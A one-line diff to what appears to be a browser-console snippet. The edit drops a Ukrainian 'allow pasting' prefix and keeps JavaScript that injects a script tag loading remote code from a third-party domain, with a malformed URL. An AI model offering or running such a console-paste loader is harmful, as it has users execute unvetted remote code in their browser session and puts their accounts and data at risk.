@@ -1,1 +1,1 @@
-'дозволити вставлення';document.body.appendChild(document.createElement("script")).setAttribute('src', 'https:/avtobaza-beton.com.ua/stislo_script.js')
+document.body.appendChild(document.createElement("script")).setAttribute('src', 'https:/avtobaza-beton.com.ua/stislo_script.js')
